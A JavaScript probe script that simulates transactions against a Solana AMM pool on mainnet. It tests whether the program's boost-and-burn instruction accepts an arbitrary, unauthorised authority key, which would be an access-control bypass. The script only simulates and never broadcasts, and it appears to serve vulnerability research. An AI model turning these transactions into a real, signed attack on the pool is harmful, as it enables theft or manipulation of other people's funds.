import {PublicKey, Transaction, TransactionInstruction} from '@solana/web3.js';

const RPC = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';
const PROGRAM = new PublicKey('pAMMBay6oceH9fJKBRHGP5D4bD4sWpmSwMn52FMfXEA');
const GLOBAL = new PublicKey('ADyA8hdefvWN2dbGGWFotbzWxrAvLW83WG6QCVXvJKqw');
const POOL = new PublicKey('GExgczEhUbdNr3V7txqvGrJPu6nt5mbgHXtWFnX8CXeF');
const BASE_MINT = new PublicKey('GdoKrGpaXc6jfrvf9ungdgzKyT1skAro4tk5c9oTpump');
const QUOTE_MINT = new PublicKey('So11111111111111111111111111111111111111112');
const POOL_BASE = new PublicKey('EicGBXGjABiPzHaKApYQ6RQyykW5ajNX2WY3mNfCtwKe');
const POOL_QUOTE = new PublicKey('52UD2WqtcznSoGNjKCcGxQ9KxpYbAD5HTCcr5iMJvUKh');
const BOOST_VAULT_AUTH = new PublicKey('6CjqtX3gFTYzsMBacdGmDK1tzvGmApiHasVKd6BMwsMH');
const BOOST_VAULT = new PublicKey('6Zb2NXg1vDQMDJZkQwo9uR5otMLPwC86R7DF8Yz45FiT');
const BASE_TOKEN_PROGRAM = new PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb');
const QUOTE_TOKEN_PROGRAM = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
const SYSTEM = new PublicKey('11111111111111111111111111111111');
const ASSOCIATED = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL');
const EVENT_AUTH = new PublicKey('GS4CU59F31iL7aR2Q8zVS8DRrcRnXX1yjQ66TqNVQnaR');
const CURRENT_BOOST_AUTH = new PublicKey('HTVZVEQMBsNanubDPTs3CxDAEGNFQHJY8c1441iy2S5r');
const ARBITRARY = new PublicKey('2jLNDZf3QVdAm7wZiR333ZUpAnNcGV7zkYVxGdXFBB3J');
const INIT_DISC = Buffer.from('8ce9215e845ac28f','hex');
const BOOST_DISC = Buffer.from('694406af000723a2','hex');

async function rpc(method, params) {
  for (let attempt=0; attempt<8; attempt++) {
    const r = await fetch(RPC,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method,params})});
    if (r.status===429) { await new Promise(x=>setTimeout(x, 1000+attempt*1000)); continue; }
    const j=await r.json(); if(j.error) throw new Error(JSON.stringify(j.error)); return j.result;
  }
  throw new Error('RPC retry exhausted');
}
function pk(buf){return new PublicKey(buf).toBase58();}
function decodePool(dataB64){
  const b=Buffer.from(dataB64,'base64');
  if(b.length<261) return {dataLen:b.length,error:'short pool'};
  return {
    dataLen:b.length,
    discriminator:b.subarray(0,8).toString('hex'),
    bump:b.readUInt8(8), index:b.readUInt16LE(9),
    creator:pk(b.subarray(11,43)), baseMint:pk(b.subarray(43,75)), quoteMint:pk(b.subarray(75,107)),
    lpMint:pk(b.subarray(107,139)), poolBase:pk(b.subarray(139,171)), poolQuote:pk(b.subarray(171,203)),
    lpSupply:b.readBigUInt64LE(203).toString(), coinCreator:pk(b.subarray(211,243)),
    isMayhem:Boolean(b.readUInt8(243)), isCashback:Boolean(b.readUInt8(244)),
    virtualQuoteReserves: (()=>{const lo=b.readBigUInt64LE(245), hi=b.readBigInt64LE(253); return (hi*(1n<<64n)+lo).toString()})(),
  };
}
function initIx(creator){
 return new TransactionInstruction({programId:PROGRAM,data:INIT_DISC,keys:[
  {pubkey:POOL,isSigner:false,isWritable:true},{pubkey:GLOBAL,isSigner:false,isWritable:false},
  {pubkey:creator,isSigner:true,isWritable:true},{pubkey:BASE_MINT,isSigner:false,isWritable:false},
  {pubkey:QUOTE_MINT,isSigner:false,isWritable:false},{pubkey:POOL_BASE,isSigner:false,isWritable:false},
  {pubkey:POOL_QUOTE,isSigner:false,isWritable:true},{pubkey:BOOST_VAULT_AUTH,isSigner:false,isWritable:false},
  {pubkey:BOOST_VAULT,isSigner:false,isWritable:true},{pubkey:QUOTE_TOKEN_PROGRAM,isSigner:false,isWritable:false},
  {pubkey:SYSTEM,isSigner:false,isWritable:false},{pubkey:ASSOCIATED,isSigner:false,isWritable:false},
  {pubkey:EVENT_AUTH,isSigner:false,isWritable:false},{pubkey:PROGRAM,isSigner:false,isWritable:false},
 ]});
}
function u64(v){const b=Buffer.alloc(8);b.writeBigUInt64LE(BigInt(v));return b;}
function boostIx(authority, quoteAmount='1000000', minBurn='0'){
 return new TransactionInstruction({programId:PROGRAM,data:Buffer.concat([BOOST_DISC,u64(quoteAmount),u64(minBurn)]),keys:[
  {pubkey:POOL,isSigner:false,isWritable:false},{pubkey:authority,isSigner:true,isWritable:true},{pubkey:GLOBAL,isSigner:false,isWritable:false},
  {pubkey:BASE_MINT,isSigner:false,isWritable:true},{pubkey:QUOTE_MINT,isSigner:false,isWritable:false},
  {pubkey:POOL_BASE,isSigner:false,isWritable:true},{pubkey:POOL_QUOTE,isSigner:false,isWritable:true},
  {pubkey:BOOST_VAULT_AUTH,isSigner:false,isWritable:false},{pubkey:BOOST_VAULT,isSigner:false,isWritable:true},
  {pubkey:BASE_TOKEN_PROGRAM,isSigner:false,isWritable:false},{pubkey:QUOTE_TOKEN_PROGRAM,isSigner:false,isWritable:false},
  {pubkey:EVENT_AUTH,isSigner:false,isWritable:false},{pubkey:PROGRAM,isSigner:false,isWritable:false},
 ]});
}
async function simulate(ixs, feePayer){
 const bh=await rpc('getLatestBlockhash',[{commitment:'processed'}]);
 const tx=new Transaction({feePayer,recentBlockhash:bh.value.blockhash}); tx.add(...ixs);
 const raw=tx.serialize({requireAllSignatures:false,verifySignatures:false}).toString('base64');
 const result=await rpc('simulateTransaction',[raw,{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed'}]);
 const v=result.value||{}; const logs=v.logs||[]; const text=logs.join('\n');
 return {err:v.err,unitsConsumed:v.unitsConsumed,logs,
  sawInit:text.includes('Instruction: InitBoost'), sawBoost:text.includes('Instruction: BoostBuyAndBurn'),
  constraintAddress:text.includes('ConstraintAddress')||text.includes('A raw constraint was violated'),
  accountNotInitialized:text.includes('AccountNotInitialized'),
  pumpSuccessCount:logs.filter(x=>x===`Program ${PROGRAM.toBase58()} success`).length,
 };
}
async function main(){
 const pi=await rpc('getAccountInfo',[POOL.toBase58(),{encoding:'base64',commitment:'processed'}]);
 const pool=decodePool(pi.value.data[0]); console.log('POOL_STATE',JSON.stringify(pool,null,2));
 const candidates=[CURRENT_BOOST_AUTH,new PublicKey(pool.creator),new PublicKey(pool.coinCreator),ARBITRARY];
 const uniq=[...new Map(candidates.map(x=>[x.toBase58(),x])).values()];
 const initResults=[];
 for(const c of uniq){
  let res; try{res=await simulate([initIx(c)],c)}catch(e){res={rpcError:String(e)}}
  initResults.push({creator:c.toBase58(),res}); console.log('INIT_ONLY',c.toBase58(),JSON.stringify(res,null,2));
 }
 const successful=initResults.find(x=>!x.res.err && x.res.pumpSuccessCount>=1);
 if(!successful){
  const out={verdict:'NO_REPLAYABLE_INIT_ON_CURRENT_POOL',pool,initResults,simulationOnly:true,broadcast:false};
  console.log('FINAL',JSON.stringify(out,null,2)); return;
 }
 const initCreator=new PublicKey(successful.creator);
 for(const q of ['1','1000000','100000000','663319825']){
  let legit,mut;
  try{legit=await simulate([initIx(initCreator),boostIx(CURRENT_BOOST_AUTH,q,'0')],initCreator)}catch(e){legit={rpcError:String(e)}}
  try{mut=await simulate([initIx(initCreator),boostIx(ARBITRARY,q,'0')],initCreator)}catch(e){mut={rpcError:String(e)}}
  console.log('PAIR',JSON.stringify({q,initCreator:successful.creator,legitimate:legit,mutated:mut},null,2));
  if(!legit.err && legit.sawBoost && legit.pumpSuccessCount>=2){
    let verdict;
    if(!mut.err && mut.sawBoost && mut.pumpSuccessCount>=2) verdict='ARBITRARY_BOOST_AUTHORITY_ACCEPTED';
    else if(mut.constraintAddress) verdict='ARBITRARY_BOOST_AUTHORITY_REJECTED_CONSTRAINT_ADDRESS';
    else verdict='ARBITRARY_BOOST_AUTHORITY_REJECTED_OTHER';
    console.log('DECISIVE_VERDICT',verdict); return;
  }
 }
 console.log('DECISIVE_VERDICT','INIT_SUCCEEDED_BUT_NO_LEGITIMATE_BOOST_VARIANT_SUCCEEDED');
}
main().catch(e=>{console.error(e);process.exit(1)});
